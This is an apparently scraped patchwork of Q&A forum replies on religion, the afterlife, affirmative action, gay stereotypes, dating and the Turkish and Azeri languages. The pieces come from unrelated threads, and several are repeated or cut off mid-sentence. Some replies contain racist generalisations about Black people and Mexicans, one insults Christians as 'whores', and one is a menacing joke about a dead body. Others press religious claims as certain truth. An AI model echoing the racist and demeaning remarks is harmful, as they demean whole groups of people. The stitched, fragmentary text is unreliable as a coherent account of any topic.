No.      2) Do you think they have the same God, if any, that you do?    Yes.  There is only one God.  However, if you mean, "do you think that they worship the same God that you do?" then obviously I would have to answer, "There is no possible way for me to determine that, but since even people on earth do not all worship God, it seems likely (but not certain!) that any potential intelligent extraterrestrial life would also not worship God."      Of course, when you consider that it is *intelligent* life to which we are referring - particularly, life intelligent enough to develop actual language - there may very well be far fewer life-capable planets in the universe than you suggest.  Then:  what's the chance that, on any intelligent-life-capable planet (ILCP), intelligent life actually exists?  If current theories are correct, intelligent life has existed on earth for (at most) 1 million years of its 8 billion year existence.  SO, if out of all the ILCPs there is only a 1 in 8,000 chance that intelligent life currently exists on those few that actually ever developed life...    I think you begin to see.  The likelihood of intelligent life on other planets *may* be much, much less than you have portrayed, despite your conservative estimates regarding the number of stars.    Of course, it's also possible that extraterrestrial life may be much more abundant than anyone suspects, existing everywhere that liquid water is found.

The majority makes the teachings of Christ of no effect by man-made traditions.      One man-made tradition is that "good people go to heaven when they die and bad people go to hell when they die."      This is taught generation after generation, parent to child, in hopes of scaring someone into being good.  But, it doesn't work, does it?      Isn't it time we transcended the fables of childhood?      No one has gone to heaven except the Son of man (John 3:13).      And hell?      Request the booklet:      Hell Is A Lie!      Free from 8v@8v.com    Where are the people who have died?      They are in their graves!    "Marvel not at this, for the hour is coming, in which all that are in the graves shall hear his voice, and shall come forth; they that have done good unto the resurrection of life; and they that have done evil, unto the resurrection of damnation" (John 5:28-29).      The King James "damnation" is from the Greek word "krisis" meaning separating and contesting.      The "contesting" takes place in a second physical life after the 1000 years.  The vast majority of mankind is not being called now.       Some of the ones who are "contesting" in the future will still not repent.  And they will cease to exist.  The ones who do repent will be given eternal life.  The promise from God through Christ is eternal life, not heaven.      People in this life who have already repented will be given bodies that do not die (1 Corinthians 15:52-54).  The same thing will happen to people called later.  They will have their chance for salvation at that time.  Most will embrace it and thereby secure eternal life for themselves.|`|9mLjDa5kaa	The truth is that death brings IMMEDIATE heaven or hell, depending ONLY on whether you believed the truth about Jesus in this life or not.     So to be in heaven and not hell, believe the truth about Jesus now! :)     Only faith alone in Jesus saves! Salvation is a FREE GIFT that happens in a split second when you believe in Jesus! It is impossible to lose or "leave" salvation.     The truth about Jesus is that the only way to be saved and to get into heaven and avoid being sent to eternal hell, is by believing in faith alone that Jesus, who is God, died for our sins on the cross as FULL PAYMENT for our sins, and then Jesus rose from the dead (1 Corinthians 15:1-4). Believe this and you will be in heaven, no matter what!     Please pray now: "Jesus, please forgive me of my sins. I believe that You died on the cross for my sins and You rose from the dead. Thank You for eternal life!" You will be in heaven with Him forever when you die. :)|`|u6Wyxmuvaa	depends what I'm going to do with your body|`|zPKwXbhKaa	religions are simply man made ideals that help people cope and keep people from questioning life by instilling certain morals within someone (aka the 10 commandments)     the truth is, you don't have to believe in anything once you die, because everyone goes to heaven in their own right. heaven in my opinion = a place either dark or light, with no war, no drama, no lovers, no disease, and solitude (but in a good way)    once people die, they are brain-dead. any recollection the mind had before death, is completely erased, so therefore, it is useless to believe in anything.     religion though greatly helps people cope with problems they face day-to-day, however, so im not against it.  just bible pushers.

There are a lot more chapters and verses mentioned in the below website along with music, speeches and praise and worship.    http://jesustrinity.blogspot.com    Jesus is God. He is alive forever.    The questions usually asked are:-    1) Did Jesus really exist?  2) Is Jesus God?  3) If Jesus is God, then why did He keep praying to the Father in Heaven? How can the Father and Jesus be one God? Why did Jesus have to suffer on the Cross?  4) What is the Holy Spirit?  5) What is so special about Jesus? Why cant I just view him as an ordinary man or a teacher or a prophet? Why should I see him as God?      It would not be possible to give a short answer to these questions .    I suggest you visit the below website.    After visiting the below website, you would get a lot of answers.    http://jesustrinity.blogspot.com    1.Thomas calls Jesus God in John 20:28 (Note, Thomas addresses Jesus  specifically.)  2. Jesus is God in Heb. 1:8  3. John the apostle states that Jesus was the Word which was God that became  flesh (John 1:1-14)  4. The phrase "Call upon the name of the LORD" (Hebrew, YHWH, i.e., Psalm  116:4) used only of God on the OT, and translated into the Greek in the LXX as  "Call upon the name of the LORD (greek, KURIOS)," applied to Jesus in the NT  (1 Cor. 1:2) Jesus is God in flesh  5. The apostle John says that Jesus was , "...calling God His own Father,  making Himself equal to God," (John 5:18)  6. Jesus said that He and the Father are One (John 10:30), that caused the Pharisees to  claim that Jesus was making Himself out to be God.  7. Jesus knew all things (John 21:17)  8. Jesus knew all men (John 16:30)  9. Jesus is everywhere (Matt. 28:20)  10. Jesus Christ, dwells in you (Col. 1:27)  11. Jesus is the exact representation of the Nature of God (Heb. 1:3)  12. Jesus is eternal (Micah 5:1-2)  13. Jesus gives eternal life (John 10:27-28)  14. Jesus is our only Lord and Master (Jude 4)  15. Jesus is called the Mighty God (Isaiah 9:6)  16. Jesus is called the Mighty God (Isaiah 9:6) and "God" also be called the  Mighty God in Isaiah 10:21  17. Jesus is able to raise Himself from the dead (John 2:19-21)  18. Jesus created all things (Col. 1:16-17), it is God who created all things  by Himself (Isaiah 44:24)  19. Jesus searches the hearts and minds of the people (Rev. 2:23)  20. Jesus is worshiped (Matt. 2:2-11; Matt.14:33; Matt.28:9; John 9:35-38;  Heb. 1:6) Only God can be worshipped (Matt. 4:10) (same Greek word for worship  is used in each place.)  21. In the OT God was seen (Exodus 6:2-3;Exodus 24:9-11; Num. 12:6-9; Acts  7:2), yet no man can see God (Exodus 33:20; John 1:18). It was not the Father  that was seen in the OT (John 6:46). Who, then were they seeing? See John  8:58.  22. Jesus claimed the divine name, "I AM", for Himself in John 8:58 see  Exodus 3:14.  23. Jesus says you must honor him even as you honor the Father (John 5:23).  24. Jesus gives life (John 5:21).  25. Jesus bears witness of Himself (John 8:18;John 14:6).  26. Jesus is the One who will judge you on judgement day (John 5:22-23). Only God can be the judge.  27. Jesus forgives sins (Luke 5:20) (Luke 24:47,Acts 10:43) .Only God can forgive sins.    http://jesustrinity.blogspot.com|`|rGEZup0Zaa	B.

I'll just paste my answer here with minimal change to fit your question. But the essence of my answer remains as below:    Christians have Jesus mixed up as an idol and think God is some damned Genie who grants their 3 wishes.    God isn't a genie. In life you have to struggle to earn your understanding, not rely on some dumb ritual and expect some magic light bulb to go off in your head. Life isn't created to be like that.    Jesus was the teacher (by his own words). Jesus never once told people to pray to him, to worship him. Jesus himself told people he was not good. And Jesus taught people to love one another and love God, not to pray to Jesus or Mary or anybody else.    And we're supposed to be unselfish and look after one another, to work hard, be intelligent and not believe in foolishness.    I see that Christians are too busy worshiping their own traditions and idols to realize the simplicity of it. But then again many are too busy being useless social climbers, climbing up the ladder, trying to impress one another with their "piety".    None of this christianity cult bs flies by the simplicity of it. It's all full of crap, man-made excuses, traditions, hypocrisy.    The only ones who have anything to do with the real meaning of what Jesus could have taught are ones who go out to look after homeless folks at night, aid workers. Doctors who volunteer to look after poor folks. Anyone who truly gives of themselves without asking for attention or anything in return.    The rest are just whores.|`|bfuYiSxfaa	Jesus made sense!!    such a shame no-one else does!!!|`|HOYIAMi2aa	It's just another religious belief - a very popular one.

It would be nice to not beleive you are superior to those with different beliefs, or that they are "declining" eternal happiness.    I accept the possibility a higher power, whether it be one or many. I do not, however, accept Christianity's teachings or any religion for that matter. In my opinion, religions and organize beliefs are more detrimental than helpful in a person's life. I believe they tell followers information that cannot be known by any human- so, I see them as fictional and false.|`|RhPNV1ohaa	That is a very important and pivotal question. Do you understand the purpose of the car? Do you understand how it is created in our image? Look at the things we share with the car. Water cooled, Temperature, Electrical system, Diagnostic system, Consumption system, Elimination system, Air breathing, Carbon dioxide exhausting. The meaning and purpose of the car is directly tied to it's creator. Without us it would not exist. Its' existence is directly dependent upon us. It is designed to serve us and if it fails it purpose well its' end is in sight. Our claims over the car are the same as God's claim over us. So if we would have meaning and purpose to life we must find out God's plan for our lives rather than following our own way. When we find His way life will spring forth in new meaning and will contain a greater value and fascination. Blessings on you.|`|OpC8Baogaa	Yeah i believe in god, though i admit im probably not his favorite person.|`|hbCs2X7Eaa	And it makes me sad to see people diseased with religion.

I never go to shows anymore because it's always the same old scenesters and scene police. **** 'em.<br>  Listen to the music. That's all that matters.

bwmKSXfvaa	The "level playing field" can only be achieved by treating everyone as equals. Discrimination, both positive and negative, does not help achieve a level playing field. The bad points of negative discrimination are obvious. Positive discrimination, even though well meaning, only results in the people it is aimed at feeling they never have to try to improve themselves or work hard because everything will be given to them anyway and also creates animosity from others who have worked hard but miss out as a result of AA.|`|39f89632f6e23012e56a1f5c420329d5aa	Most of the educated minorities that I've spoken with find affirmative action insulting.  Whatever the "stated goal" is, it also brings the "token" minority into a work environment even when they aren't competent to do the job. This results in resentments on both sides.  The government tried to legislate the prejudices of the people, plain and simple, and it isn't working.  There are those minorities who will apply for jobs that they know they are not qualified for, simply because that company is "under-represented".  The position is filled by someone who is never considered an asset, reaffirming the original prejudice.  Then, the minority who is qualified misses the opportunity.  <br>  <br>  Affirmative action does not counteract discrimination.  It reaffirms the reasons for discrimination, and implies that minorities must be given a job out of charity, rather than having earned a place in the work environment.  It doesn't level the playing field.  In fact, it implies that they require special treatment based on their inferior capability, instead of being given the opportunity to compete for a job based on qualification.<br>  <br>  I don't know anyone who got a job through affirmative action that remained satisfied in their position, or who was promoted to a top level after being there for the same time as their co-workers.|`|eyLYfEpBaa	the "playing field" can only be truly leveled by competence.|`|ij4KdOwQaa	Reality is what it is.  People are treated differently.  And if you skin happens to be anything but white, you are treated worse than everyone else.  So to even the scales, those people are given special attention.  However, it fails to really solve the problem of bias and unfair racism.|`|5937283b2f216bb5db16569e5bcc029eaa	My answer to you is, affirmative action is pure racism against white people. I know this is not a poplar belief among the STATE educated masses. The U.S. government gives huge grants to states that use affirmative action. The states are like sucking   puppies the only thing that matters is getting the next grant! It will interesting to see what will happen with all the Mexicans flowing into the U.S.   When the people who are now using affirmative action now will no longer be used for them, but instead affirmative action goes to the Mexicans. What then?|`|5b47139d67d764830d0dea41a0e61950aa	No. Affirmitive action is stupid. It denies a more qualified individual a job because he's white or Asian. Slave owners BOUGHT slaves, they were regarded as property in those days. Blame the black tribes in Africa that sold their rivals into slavery. Affirmitive action is a way for lazy, racist blacks to fill their pockets while hijacking America.<br>  <br>  What does that also say about blacks if they need affirmitive action to get a job?|`|t4VP6fcHaa	shall we organize into groups and decide.conversation is an art!I love your point/question|`|AA10057370	No.many times people with greater GPA are passed over.<br>  If fairness is wanted then all the highest GPA should be accepted with no care either way of race.|`|AA11272456	Affirmative action had its start long before the 20th century. In fact, it began around the 17th century when European indentured servants were replaced by African slaves. White Americans were given a head start with such moves as the 1830 Indian Removal Act, the 1862 Homestead Act, the 1790 Naturalization Act and much more.  Nobody but white Europeans benefited from this affirmative action.<br>  <br>  Racial preferences (for whites) continued right on up to 1962.<br>  <br>  Racial preferencing has a long institutional history - a white institutional history. Government programs and practices channeled wealth and opportunities to white people at the expense and exclusion of others.<br>  <br>  I am not altogether certain if affirmative action levels the playing field for people of color, but it sure did work for whites back then.<br>  <br>  <br>  Hannah J Paul
gIxWQ0iQaa	I know many straight girls who will sit through lesbian porn.  Erotic activities are just that:  erotic.  They're not gay or bi.    It's a bit of a paradox but it'll probably happen more with lesbian porn than gay porn.

If you are disgusted by being with a girl, then you're not homosexual or even a little bit homo.|`|769q3vdCaa	It's possible to be turned on by watching girls but not actually want to do it yourself. It's called a FANTASY, a sexual fantasy. This doesn't mean you are gay or bi, it's just what you like to watch. If you are not interested in doing it yourself with another girl, then good chance is you're probably not bisexual...especially if the thought disgusts and repulses you.   So, you like girl on girl porn but you don't like girls. It's okay and quite more common than you'd think.   Enjoy!|`|bsl9mEYEaa	other answerers (except asad m grrrr) have pretty much answered it so just to add I think you should just wait and see if you ever fall in love with a girl, if not, and it repulses you then your bisexual but only enjoy apsects of lesbainism.

So to be in heaven and not hell, believe the truth about Jesus now! :)     Only faith alone in Jesus saves! Salvation is a FREE GIFT that happens in a split second when you believe in Jesus! It is impossible to lose or "leave" salvation.     The truth about Jesus is that the only way to be saved and to get into heaven and avoid being sent to eternal hell, is by believing in faith alone that Jesus, who is God, died for our sins on the cross as FULL PAYMENT for our sins, and then Jesus rose from the dead (1 Corinthians 15:1-4). Believe this and you will be in heaven, no matter what!     Please pray now: "Jesus, please forgive me of my sins. I believe that You died on the cross for my sins and You rose from the dead.

It just makes me so scared."    I used to be terrified of dying. I was a Christian before but not  a strong stron believer. But then I went to a church camp and that all changed. Now that I accepted Jesus in my life and have had experiences showing he really IS real, I'm not afraid anymore, because I think I have a good chance of entering heaven.     Whenever I doubt, I go to the bible, or turn on a Christian music radio station and listen to the words, and that doubt goes away. Have you accepted Jesus? If not here's a prayer:     "God, I know that I have sinned against you and deserve punishment. But Jesus Christ took the punishment that I deserve so that through faith in Him I could be forgiven. I receive your offer of forgiveness and place my trust in You for salvation. I accept Jesus as my personal Savior! Thank You for Your wonderful grace and forgiveness - the gift of eternal life! Amen!"    And though it's kind of lame here's a link to show you what it means: http://www.wikihow.com/Accept-Christ-As-...

That would make me wonder what kind of God you are rejecting. I'm a Christian but Hell and devils have nothing to do with my belief. Why kind of God is that. I know God is not something that's supposed to scare you.    The best way to resolve it is by prayer.

I grew up in a Christian household as well, and it took me years before I was able to accept Christ in my life as my personal savior. I've had my share of struggle and hardhship, just like anyone else, but one thing I can tell you is that I would absolutely NOT be here right now if it were not for God and His wonderful glory. There are going to be many times when the enemy (Satan and his army of demons) will throw distractions and temptations at you, trying to steer you away from God's protection. Don't let him separate you from God..that's when you become vulnerable to his attacks. If you're living under God's word, He will protect you. He promises it. Just like Jesus says in Luke verse 10:19, "Behold, I have given you authority to tread on serpents and scorpions, and over all the power of the enemy, and nothing will injure you." ...So don't let the enemy intimidate you or strike fear into your heart. Of course, no one wants to go to hell, but it's not so much a punishment as it is a separation from God. If you live your life separated from God on earth, why would you be granted the privilege of spending eternity with Him in HIS home in heaven? Just try reading some excerpts from your bible or devotional to help you get connected to God. Do you have a pastor you can talk to at your church about any questions you may have? ..I always have a lot of spiritual questions, it helps to have a pastor or even a prayer warrior who you can talk to. ...Stay strong in your faith! You may not always feel like God's there, but He always is. You can count on it. Just pray to Him and have faith. Faith is the key ;]  It's a whole lot easier if you surround yourself in the word of God and go to church on a regular basis.   Be careful of the material and even people you're exposing yourself to. I know it sounds a little extreme, but I have fallen into demons' traps numerous times, unaware of the harm they were causing...until it was almost too late.   ...It can be hard to see that God is there, but just keep praying. He has answered so many of my prayers and saved my life countless times.  I would even recommend buying a devotional study bible..those can be so much fun to read, and some versions even have you write some reflections like a diary. ..Great way to connect with God =]    Hang in there, Jen...and have faith! =]|`|4ZqwvUxyaa	its simple    if there was no religion,    the world would be barbaric    no law no order infinite disease,    crime would have no meaning,    rape and torture would be the norm,    just sit down and really think about it    humans need god more than they know
c0125a2c9826a9b04968f2c2fcc1d60faa	I agree with you.  Jesus wouldn't allow His disciples to fight for Him and what nobler cause can we think of but to save a good man from being murdered.

If he strikes you again, you must forgive him and offer peace.  If he strikes you again, you must forgive him and offer peace.

Xxt4pEyEaa	I put a damper on that ability your husband has. My guy used to "think" in all slyness that he could check out cute girls without me noticing. He didn't realize while he thought he was just moving his eyes askew, his whole damn head was jerking! Lucky he didn't get whiplash. But to holler at such a simpleton who I love very much would be wrong. But after a couple stoplights and me hollering catcalls out the window to ANY guy walking down the street rendered my man just a straight ahead look at the road driver while I'm riding shotgun. Sad, really. But it's brought us closer. A kind of telekinesis of sort. I place one hand on the dash or push left leg to floor, he slows. It is truly amazing!

576e76ca46b6c4293f45926a8e75773caa	Good job! You just stereotyped a huge group of people because one of them acted that way.|`|vjVnpXcnaa	Uhm, i personally LOVE gay guys, they're like the ultimate bestfriend (for the girls i mean) because they're JUST like one of the girls, except they're not. A lot of the time they are really good at picking out clothes and designing whatever. But i think they're just very outspoken, which I'm okay with because i am too. I think they're a good time, fun to be around, loud and crazy. Sure, they're sensative I'll agree but i wouldn't put them in the category of annoying, its just them straight people that see more problems in them than we do. I'm bi.    And true that, ANY orientation could be this way!|`|spbqfjvbaa	So, these stereotypes are not just owned by gay people.  Straight people can act this same exact way, too.  You can act this way regardless if you're gay or straight.    It's an individual's personality that will make them act/appear to act rude, sensitive & draw conclusions without evidence.  And, since gays & straights are still people, any one of us can have this personality flaw.  Some straight people are annoying & sensitive, but I'm not going to say that ALL straight people are like that, since it;s not true.    Look at the individual person & leave their sexuality out of the picture.  The guy may be annoying because he IS annoying, not because he's gay.  Not all gay people fit this stereotype....|`|BU6pYizfaa	I'm gay and i do consider myself a bit too sensitive. I'm am really nice though. But not all gay guys are like that.|`|SsEAvhs7aa	Stereotypes, stereotypes, stereotypes. Gays are just like you and me. Stop using stereotypes. Gay guys don't all dress like girls, they don't all look effeminate, they are not all sensitive, I even know some who are heartless. So talk about that person if you want but stop making generalizations starting with him.|`|cIvFOzoiaa	OMG!  I know!  All gay people are totally rude crybabies! *sarcasm*  I hope you realize what a jerk you sound like by asking this question.  I understand you're in middle school, but that's a stereotype.  Also, straight people can be just as annoying as certain gay people.  Try to understand that stereotypes aren't true about everyone.  Just because one gay kid in middle school acts annoying doesn't mean all gays act that way.  You probably know plenty of nice gay people, you just don't know they're gay because they don't act stereotypical.|`|pb3vQv1haa	THey R Just Really Cute...Well Boy ones|`|JhEboCmDaa	Notice how almost half of the gay people answering here got offended,e even though you were asking a legitimate question and even asked if it was normal for all gay people.    I agree that lots of gays act like that. they're usually the flamboyant, loud, ultra feminine types. I just avoid those people, they seem like they're just being gay for attention; everything they do seems like it's done for attention. I'm not saying it is, but it comes off that way.    Anyway, not all gay guys are like that. I'm not overly sensitive, I'm pretty neutral on everything, and I'm gay. You probably just don't realize the normal gay guys are there, because they don't stand out from the straight guys. :)    I'm totally gonna get flamed for this...

I have become extremely sensitive to other peoples' feeling, by choice.    When someone I know is upset, for instance, I generally know it within seconds of when they walk into the room. I don't know how, they don't have to say anything, but I just know. And I have never (as far as I know) been wrong.    So I think "gaydar" is just one aspect of general sensitivity.|`|GJFBsG62aa	To an extent yeah.|`|1cYPOJkqaa	If it exists then I don't have it. At all!|`|7q78bhAaaa	yes, i bought mine at target.

When I was in high school, there were so many guys who I KNEW were gay, but of course at the time, they were still in the closet. I figured I was overreacting, and it was only wishful thinking. Until after graduation, as time went on, I kept hearing about "who" came out, and it turned out that all of my suspects were in fact guilty. I wouldn't go as far as to say you have to be gay to have it, but being gay definitely makes you more astute to it, considering you have a vested interest in the outcome of your assumptions.|`|FROVo8WWaa	no! people have called me gay because i'm articulate& smart . i have no attraction to men so i'd say gaydar is just wishful thinking for some people.|`|X1qNJMhEaa	No. because in the black community gay-dar is often on lay a way.|`|0xz8mR2xaa	Not really. I think it more just spots gender deviancy, at least mine. With the increasing normalization of male effeminacy and scene kid culture, it's probably misfiring most of the time.|`|xjmgipTKaa	I do, in a way.  I believe a lot of people say it just to accuse someone of being gay even when they're not...hence the line 'you're breaking my Gay-dar'  But I have always been able to see the 'gay side' to people, and yes I do believe everyone has a 'gay side'. I've always been able to see it in people. My friends always make fun and say I see the gay in everyone...but it's true.  I don't know if you can tell if someone is 'completely' gay, but maybe other people can, the way I can see people's 'gay sides'  xxx~Blessed Be~xxx

You have to draw the line between not liking his sexual orientation and not liking him as a person - if he's a great friend to you and you can look past him being gay, don't stop being his friend.

And yet there are glimmers of atheism even there, and more blasphemy than you'd imagine was permitted, a priest admitting his entire career has been selling fake relics to desperate and ignorant peasants seeking magical healing...    The Three Musketeers was of a similar bent, very religious, but with an edge of blasphemy. Don Quixote too. Closer to the 20th century the works become drawn to one side or the other, such as H.

Or suggest you do some school work at a cafe, keep it casual, so its not really a date, but you are seeing her outside of school. This might be the best plan because if you did directly ask her out, it could make it awkward for the rest of school.    Good luck, Vik

gWOQd9Xcaa	........ The TRUTH stays firm.,,, and .. the Lie is born to Perish......    well,, firstly most of the religious scriptures claim that God is One with no partner.. but its just the Muslims who follow and practice that..  ? In the Jewish Holy Book God said:  "I am the first, and I am the last; and besides me there is no God" (Isaiah 44:6).   ? "You shall have no other gods besides Me." (Exodus 20:3).   ? In the Christian Holy Gospel Jesus (P*) said "The first of all commandments is, 'Hear, O Israel; The Lord our God is one Lord' " (Mark 12:29, Deut 6:4).   ? The Holy Quran says: "Say, He is God, The One and Only" (Q* 112:1)   ? Hindu Holy Book  Rig Veda says: "There is only one God, worship Him" (Rig Veda, Vol. 6, Hymn 45, verse 16 )...    and speaking about Jesus peace be upon him.. Muslims believe he was a prophet just like prophets before him John Abraham Joseph..,,so Jesus(P*) messenger of God,, but not God himself..   evidence..Jesus (P*) said: "I can of mine own self do nothing" (John 5:30).     we Muslims believe that Jesus(p*) healed lepers,                                                 caused the blind 2 see                                               & did raise up dead.. but this all was by God's (ALLAH) will..  as mentioned in Acts 2:22,  Men of Israel, hear these words: Jesus of Nazareth, a man attested to you by God with mighty works and wonders and signs which God did through him in your midst, as you yourselves know...     and.,, then about the final messenger of God.. Prophet Mohamed (p*)  is prophesized  in                              Deuteronomy 18:15               Deuteronomy 18: 18-19            Malachi 3:1                Isaiah 40:3:4               John 14:16               even in Hindu scriptures..  Kalki Avatar = Prophet Mohamed(P*)                            Kalki Puran Adhay 2, Shloka 15                           Kalki Puran, Bhaghwat Puran Khand 12)                              (Bhagwat Puran Khand 12, Adhay 2, Shloka19-20                           Kalki Puran Adhay 2, Shloka 7                            Bhagwat Puran Partham Khand Adhay 3, Shloka 25.    en list goes on..        Concluding.. if we were to comparitively study.. the holy scriptures keeping aside what the believers have to say or do..  The answer becomes clear that Islam is the only thruth..    Allah(God) have send many messengers and send them revelations.. like Gospel Bible.. Quran.. etcc .. in diffrent time and diffrent places to Guide diffrent ppl to the right direction..     but in the end God send the revelation of the Quran to his last messenger prophet Mohamed(P*),( Mercy to the World)  and also God Promised to protect the Quran from any corruptions as done to other scriptures like bible by man..      P* = Peace be upon him..|`|C1IwpPwPaa	Every Religion Claims That It Is The Truth - The Criteria Of The Truth  There are so many sects, cults, religions, philosophies, and movements in the world, all of which claim to be the right way or the only true path to Allah (God). How can one determine which one is correct or if, in fact, all are correct? The method by which the answer can be found is to clear away the superficial differences in the teachings of the various claimants to the ultimate truth, and identify the central object of worship to which they call, directly or indirectly. False religions all have in common one basic concept with regards to Allah. They either claim that all men are gods or that specific men were Allah or that nature is Allah or that Allah is a figment of man's imagination.  Thus, it may be stated that the basic message of false religion is that Allah may be worshipped in the form of His creation. False religion invites man to the worship of creation by calling the creation or some aspect of it God. For example, prophet Jesus invited his followers to worship Allah but those who claim to be his followers today call people to worship Jesus, claiming that he was Allah!  Buddha was a reformer who introduced a number of humanistic principles to the religion of India. He did not claim to be God nor did he suggest to his followers that he be an object of worship. Yet, today most Buddhists who are to be found outside of India have taken him to be God and prostrate to idols made in their perception of his likeness.   By using the principle of identifying the object of worship, false religion becomes very obvious and the contrived nature of their origin clear. As God said in the Our'aan:  " That which you worship besides Him are only names you and your forefathers have invented for which Allah has sent down no authority: The command belongs only to Allah:  He has commanded that you only worship Him; that is the right religion, but most men do not understand ".  (Soorah Yoosuf 12:40)  It may be argued that all religions teach good things so why should it matter which one we follow. The reply is that all false religions teach the greatest evil, the worship of creation. Creation-worship is the greatest sin that man can commit because it contradicts the very purpose of his creation. Man was created to worship Allah alone as Allah has explicitly stated in the the Quran:  " I have only created Jinns and men, that they may worship me "  (Soorah Zaareeyaat 51:56)  Consequently, the worship of creation, which is the essence of idolatry, is the only unforgivable sin. One who dies in this state of idolatry has sealed his fate in the next life. This is not an opinion, but a revealed fact stated by Allah in his final revelation to man.  The following criteria can best serve as a gauge to find out the authenticity of the last revelation (the Quran) as words of God:  1. Rational Teachings: Since our Creator bestowed reason and intellect upon us, it is our duty to use it to distinguish the TRUTH from falsehood. True, undistorted revelation from God must be rational and can be reasoned out by all unbiased minds.   2. Perfection: Since our Creator is all perfect, His revelation must be perfect and accurate, free from mistakes, omissions, interpolations and multiplicity of versions. It should be free from contradictions in its narration.   3. No Myths or Superstitions: True revelation is free from myths or superstitions that degrade the dignity of our Creator or man himself.   4. Scientific: Since our Creator is the Creator of all knowledge, true revelation is scientific and can withstand the challenge of science at all times.   5. Factual Prophecy: Our Creator is the Knower of the past, present and future. Thus His prophecies in His revelation will be fulfilled as prophesied.   6. Inimitable By Man: True revelation is infallible and cannot be imitated by man. God's true revelation is a Living miracle, an open book challenging all mankind to see and prove for themselves its authenticity or veracity.  read these books:  1- Dr. Maurice Bucaille is a french scientist converted to Islam and write this book  "The Bible,The Qur'an & Science" it is amazing book you can download it here http://www.ef7am.com/Files/Books/En/The_...  2-  Dr. Gary Miller is a scientist also converted to islam he wrote this book  "Amazing Quran" you can download it here   http://www.ef7am.com/Files/Books/En/Amaz...  3-  Dr. zakir Naik  wrote this fantastic book it show you the truth   "Concept of GOD in major religions" you can download it here  http://www.ef7am.com/Files/Books/En/GOD_...  http://www.islamreligion.com/ provide live help (online) by chat you can ask any question you want about Islam|`|Il9MmvTqaa	because islam is the best religion|`|ao6lLrTqaa	It is a religion of coercion.  Born a Muslim die a muslim, Convert to Islam, remain in Islam; that is their approach to maintaining their religion. All religion  is an unnecessary evil.  Religions are man-made and are made up of superstition, occults and tradition of man.  What man needed is not religion.  Man fell into sin and needed salvation.  Religion cannot save, it divide and destroy  instead.  Wars are fought and more people have die in the name of religions than all wars combined. Satan use religons to deceive the captivate the mind while man use religions to exploit their fellow men.  That is why in every relgion there are splinter groups, sect and denominations.    GOD did not gave man relgion,  He gave His only begotten Son to die and save man from death and the power of sin and Satan.  The Son of GOD by His death and resurrection is able to change the sons of man into the sons of GOD.  That is how GOD save man from destruction of Satan.

Isa 65:25  The wolf and the lamb shall feed together, and the lion shall eat straw like the bullock: and dust shall be the serpent's meat. They shall not hurt nor destroy in all my holy mountain, saith the LORD.     It is a description of the world AFTER we return to earth after the 1000 years in heaven !

What I have observed about White dudes, is that many of them adore non-White girls (which would include Latinas), but are usually nervous about approaching us in. And thanks to the good old media, Latina & Black girls are not likely to be approached by White dudes, because of the wonderful stereotypes of us being "loud, ghetto, hoochies".  I read lots of online forums and once viewed some White guy asking the following question,  " Black girls, do you find me attractive? I love Black girls but they only date Black guys and I am scared of them"  WTF!  I'm sure many White guys admire you from afar but assume that since you are Latina, you A) only date fellow Hispanics and B) Are ghetto.  The Asian girls who said that "White guys prefer them" sound like snooty wenches.  All that said, I have to ask, what is so special about White guys anyway?

y02PZj22aa	Your hormones have started functioning.  You sound a lot like many other people have sounded when they were biologically ready for independence but society has other ideas.  You are doing a better job of channeling your energies into positive directions than many people:  You have a job, you're saving money, and you are making good grades.    Here's a suggestion:  Since you are an excellent student, you might want to investigate to see if your school system has an Advanced Placement program or an Early College program.  You might benefit from taking college courses at the local community college next year.  One of my kids took all his advanced mathematics courses at the community college because his high school didn't go past trigonometry and he wanted to take calculus--perhaps you could do that?  Or take advanced English or science or language courses.  They should be more challenging than the courses you're currently taking.    When you get to college, you'll most likely go elsewhere for that experience.  Once you have actually had some time elsewhere, you can decide whether to fly away or to return to the nest.

I would think I would be happier some where else. But if you can't be content with where you are now it doesn't matter where you go. Life is strange but keep your mind on what is good in your life.

nPpyQslraa	In Turkish, inferential past tense -mi? is used to precisely indicate inference. Therefore, it will not be used often with the first person.    In Azeri,  -mi? is used more commonly to indicate status, so it goes often with the first person as well. Also, particularly in spoken language,  the inferential -mi? is replaced with -ib for second and third persons.     For example, the Turkish "gelmi?sin" (apparently, you came) becomes "gelibsen" in Azeri (also notice that i in the second person suffix is replaced with an (open) e in Azeri).    As for the general differences, the split between the two langues dates at most 7-8 centuries (the common ancestor being Iranian Turkish). For example, you cannot characterize the divan of Hatayi (Shah Ismail of Iran), who lived in the 16th century, as being distinctly Turkish or Azeri. In the last 200 years, Azeri has been influenced more by Russian, while Turkish has been influenced by French and English, leading to important differences in vocabulary; but the grammatical differences are relatively minor.|`|hscH4jHcaa	Azeri  and Turkish are very similar to each other and we can understand each other very well. There are only a few words that different in these languages. I am watching an Azeri TV channel right now and do understand every single word they are saying.|`|FLLoVSlMaa	Even though Azeri and Turkish have lots of words in common but the dialect is completely different . Specially the verbs and tenses. Even some common words have completely different meanings  in these two languages . There are different dialects of Azeri that are somehow different , the one which is spoken in Azerbaijan one of former soviet union states has some common words with Russian   whereas the one is spoken in north west  of Iran influenced by Farsi . However Azeri is very near to the dialect is spoken in east of Turkey . Generally if a person was born in Ankara or Istanbul will have difficulties to understand Azeri .
AA11703455	It was the fulfillment of the promise that God had made to Abraham, that the land that he lived in as a wanderer would be given to his descendants.    What is interesting is that they DIDN'T go directly to the promise land, rather it was into the desert of the Sinai. This people was not yet united or trained to face the armies in the promise land. So, God took the long way there, so that they could leave the mentality of slaves, develop trust in his promise and direction.    And they failed. They would not follow Moses without complaining, and they would disobey the direct laws that just weeks earlier they had agreed to. So, forty years passed before the older men died off, and it was a new generation followed Joshua into the promised land.|`|W7a5k7Zsaa	God had promised the land to Abraham.

AA11114869	Interesting query...    The part of your question which struck me the most was this:  ---..." There are hundreds of these sorts of arguments and problems out there... we base what is beyond (or any other preposition) our universe on what we know and trust with our own perspective and proved science."...---    PERSPECTIVE:  Aye, there's the rub!  I am reminded of a line from the movie 'The Prestige' where Nicola Tesla tells Robert Angier, "... exact science, Mr. Angier, is not an exact science".  It does make one wonder if we, humans, are truly doomed by our own intelligence in knowing that nothing can or ever will be determined with any absoluteness; no truly 'proved science' at all.    Of course, much of what you stated seems to touch on some cosmological takes on the anthropic principle, the gist being that we perceive everything the way we do because we came to exist under the conditions of everything we perceive; were those conditions any different, - we would not exist.  If your interested in the topic, Stephen Hawking does a nice job of explaining the anthropic principle in his book 'A Brief History Of Time'.    In closing, - I will leave you with this quote:  ---..."LIFE NO ARGUMENT. - We have arranged for ourselves a world in which we are able to live - with the postulation of bodies, lines, surfaces, causes and effects, motion and rest, form and content: without these articles of faith nobody could now endure to live!  But that does 